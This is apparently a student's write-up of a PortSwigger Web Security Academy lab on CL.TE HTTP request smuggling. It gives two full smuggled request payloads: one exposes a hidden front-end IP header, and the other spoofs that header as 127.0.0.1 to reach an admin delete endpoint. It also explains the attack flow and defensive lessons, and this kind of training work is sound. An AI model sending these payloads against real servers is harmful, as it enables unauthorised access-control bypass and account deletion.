HTTP Request Smuggling - Revealing Front-End Request Rewriting
Concept

This lab demonstrates how HTTP Request Smuggling can be used to discover HTTP headers automatically added by the front-end server.

These headers are normally hidden from users, but if the back-end trusts them, they can be abused to bypass access controls.

Server Behavior
Front-end
Uses Content-Length (CL.TE)
Blocks access to /admin
Automatically adds an HTTP header containing the client's IP address.
Back-end
Uses Transfer-Encoding
Trusts the IP header added by the front-end.
Goal
Discover the hidden IP header added by the front-end.
Spoof the client's IP as:
127.0.0.1
Access:
/admin/delete?username=carlos

and delete the user.

Phase 1 - Discover the Rewritten Header

Smuggle a POST request to the search functionality.

POST / HTTP/1.1

Host: LAB-ID.web-security-academy.net

Content-Length: ...

Transfer-Encoding: chunked



0



POST / HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 200

Connection: close


search=test

Why the Search Function?

The search page reflects the submitted search term.

After the request desynchronization, part of the rewritten request is reflected back in the response, exposing the front-end modifications.

Result

The response reveals a previously unknown header.

Example:

X-cDfQ0n-Ip: 156.195.xx.xx

This confirms that the front-end automatically injects this header before forwarding requests.

Phase 2 - Spoof the Internal IP

Once the header name is known, send another smuggled request.


POST / HTTP/1.1

Host: LAB-ID.web-security-academy.net


Content-Length: ...

Transfer-Encoding: chunked

0



GET /admin/delete?username=carlos HTTP/1.1

X-cDfQ0n-Ip: 127.0.0.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 200

Connection: close



x=1

Why 127.0.0.1?

The admin panel only allows requests originating from:

127.0.0.1

Since the back-end trusts the rewritten header, spoofing its value bypasses the IP restriction.

Attack Flow
Client
    │
    ▼
Front-end
(Content-Length)

Adds:

X-cDfQ0n-Ip: <Real IP>

    │
    ▼
Back-end
(Transfer-Encoding)

Trusts the injected header

    │
Attacker discovers the header name
    │
Spoofs:

X-cDfQ0n-Ip: 127.0.0.1

    ▼
Admin access granted
Why This Works

The front-end rewrites incoming requests by injecting additional headers.

HTTP Request Smuggling exposes these hidden modifications.

If the back-end blindly trusts the injected header, an attacker can forge its value and bypass access controls.

Key Takeaways

Front-end proxies may automatically rewrite HTTP requests.

Hidden headers can be discovered through Request Smuggling.

Applications should never trust client-controlled IP headers without verifying their source.

Trusting rewritten headers can lead to authentication and authorization bypass.

Request rewriting is another real-world impact of HTTP Request Smuggling.

References

PortSwigger Web Security Academy – HTTP Request Smuggling

PortSwigger – Revealing Front-End Request Rewriting
